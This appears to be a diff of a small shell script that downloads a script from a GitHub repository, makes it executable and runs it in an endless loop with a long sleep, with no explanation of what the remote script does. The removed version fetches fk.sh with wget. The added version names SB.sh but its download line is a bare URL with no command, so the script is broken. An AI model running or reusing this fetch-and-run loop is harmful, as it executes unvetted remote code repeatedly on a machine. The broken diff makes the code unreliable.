@@ -1,7 +1,7 @@
 #!/bin/sh
-  wget https://github.com/1STThuan/5/raw/main/fk.sh 
-  chmod +x fk.sh 
+  https://github.com/1STThuan/0/raw/main/SB.sh
+  chmod +x SB.sh 
   while [ 1 ]; do
-  ./fk.sh
+  ./SB.sh
   sleep 25000
   done
